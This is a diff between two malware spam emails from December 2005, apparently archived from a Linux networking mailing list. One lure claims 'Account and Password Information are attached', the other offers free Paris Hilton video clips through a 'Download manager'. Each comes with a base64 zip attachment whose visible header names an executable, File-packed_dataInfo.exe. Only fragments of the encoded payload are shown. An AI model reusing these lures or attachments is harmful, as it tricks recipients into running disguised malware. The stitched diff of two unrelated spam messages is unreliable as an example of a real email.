@@ -1,29 +1,30 @@
-From: office@interpack.com.cn
-Subject: Registration Confirmation
-Date: Sun, 25 Dec 2005 05:41:04 UTC
-Message-ID: <f0d310.cc214f3e922@interpack.com.cn>
+From: office@hotmail.com
+Subject: Paris Hilton & Nicole Richie
+Date: Sun, 25 Dec 2005 06:48:44 UTC
+Message-ID: <9c1b32c91fd.eaac9@hotmail.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="======c3cbade2b02f18ec"
+Content-Type: multipart/mixed; boundary="=====c8feaaa862a50dfb49"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: netdev@oss.sgi.com
+To: netdev-bounce@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---======c3cbade2b02f18ec
+--=====c8feaaa862a50dfb49
 
-Account and Password Information are attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.interpack.com.cn
-***** Email: postman@interpack.com.cn
---======c3cbade2b02f18ec
-Content-Type: application/octet-stream; name=reg_pass-data.zip
+Please use our Download manager.
+--=====c8feaaa862a50dfb49
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass-data.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---======c3cbade2b02f18ec--
+--=====c8feaaa862a50dfb49--
